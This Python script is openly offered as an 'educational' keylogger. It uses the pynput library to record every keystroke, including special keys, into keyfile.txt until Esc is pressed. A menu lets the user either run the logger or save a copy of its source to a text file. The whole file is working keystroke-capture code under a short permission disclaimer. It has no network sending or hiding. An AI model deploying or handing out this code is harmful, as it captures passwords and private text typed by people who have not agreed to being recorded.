# This is a keylogger for educational purposes only. 
# Please ensure you have explicit permission before using it.
# It will create a keyfile.txt automatically when you start typing.
# All the best!

from pynput import keyboard

def main_menu():
    """Display the main menu and return the user's choice."""
    print("\nMain Menu:")
    print("1. Save this code to a .txt file")
    print("2. Execute keylogger directly")
     
    choice = input("Enter your choice (1 or 2): ")
    return choice

def save_code_to_file():
    """Save the keylogger code to a .txt file."""
    code = """
from pynput import keyboard

def on_press(key):
    with open("keyfile.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            logkey.write('[' + str(key) + ']')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
"""
    try:
        with open("keylogger_code.txt", "w") as file:
            file.write(code)
        print("Code has been saved to keylogger_code.txt")
    except Exception as e:
        print(f"Error saving code: {e}")

def on_press(key):
    """Log the pressed key to a file."""
    with open("keyfile.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            logkey.write('[' + str(key) + ']')

def on_release(key):
    """Stop the listener if the escape key is pressed."""
    if key == keyboard.Key.esc:
        return False

def keylogger():
    """Start the keylogger listener."""
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"Error starting keylogger: {e}")

if __name__ == "__main__":
    print("Press 'Ctrl + C' to terminate and return to the main menu.")

    while True:
        choice = main_menu()
        if choice == "1":
            save_code_to_file()
        elif choice == "2":
            print("Executing keylogger directly...")
            keylogger()
        else:
            print("Invalid choice. Please enter 1 or 2.")
